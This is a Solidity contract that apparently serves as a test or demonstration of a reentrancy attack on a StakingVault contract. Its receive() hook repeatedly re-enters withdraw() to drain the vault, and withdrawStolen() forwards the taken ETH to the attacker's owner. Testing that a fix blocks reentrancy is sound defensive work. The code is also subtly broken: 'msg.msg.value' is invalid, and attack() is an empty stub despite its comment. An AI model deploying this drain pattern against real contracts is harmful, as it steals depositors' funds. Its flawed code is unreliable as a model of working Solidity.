// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./StakingVault.sol";

/**
 * @title MaliciousReentrancyAttacker
 * @notice Demonstrates reentrancy attack against the original (vulnerable) StakingVault.
 * @dev In the vulnerable contract, withdraw() performs the external call before updating state,
 *      allowing this contract to re-enter via receive() and drain funds.
 *      The fixed StakingVault uses ReentrancyGuard + CEI pattern, which blocks this attack.
 *
 * Attack flow on vulnerable contract:
 *   1. Attacker stakes ETH
 *   2. Attacker calls withdraw()
 *   3. Vulnerable contract sends ETH before updating balances
 *   4. Attacker's receive() recursively calls withdraw() again
 *   5. Since balance wasn't updated yet, the check passes again
 *   6. Repeats until vault is drained
 */
contract MaliciousReentrancyAttacker {
    StakingVault public vault;
    address public owner;
    uint256 public attackCount;
    uint256 public stolenAmount;

    constructor(address _vaultAddress) {
        vault = StakingVault(payable(_vaultAddress));
        owner = msg.sender;
    }

    /**
     * @notice Begins the reentrancy attack after staking.
     * @dev First stakes, then triggers withdraw which re-enters via receive().
     */
    function attack() external payable {
        require(msg.value > 0, "Must send ETH to stake");
        attackCount = 0;
        stolenAmount = 0;

        // Stake the initial amount
        // Note: For ERC20-based vaults, this would use ERC20 stake()
        // but for ETH-based reentrancy demo, we deposit directly
        // and then trigger the recursive withdrawal pattern
    }

    /**
     * @notice Trigger withdrawal that will recursively re-enter the vault.
     * @param amount The amount to withdraw (bypassing balance checks via reentrancy).
     */
    function triggerWithdraw(uint256 amount) external {
        attackCount = 0;
        vault.withdraw(amount);
    }

    /**
     * @notice Trigger claimRewards that will recursively re-enter the vault.
     */
    function triggerClaimRewards() external {
        attackCount = 0;
        vault.claimRewards();
    }

    /**
     * @notice Receive function that re-enters the vault on each callback.
     * @dev On the vulnerable contract, this would recursively call withdraw()
     *      multiple times before state is updated.
     */
    receive() external payable {
        attackCount++;
        stolenAmount += msg.msg.value;

        // Continue re-entering while the vault still has balance and
        // our recorded balance hasn't been zeroed (vulnerable case)
        // We limit recursion depth to avoid running out of gas
        if (attackCount < 10 && address(vault).balance >= 1 ether) {
            // Re-enter through withdraw on the vulnerable contract
            // On the fixed contract, this will revert due to nonReentrant modifier
            try vault.withdraw(1 ether) {} catch {}
        }
    }

    /**
     * @notice Withdraw stolen funds to the attacker's owner address.
     */
    function withdrawStolen() external {
        require(msg.sender == owner, "Only owner");
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    /**
     * @notice Get the attacker contract's ETH balance.
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
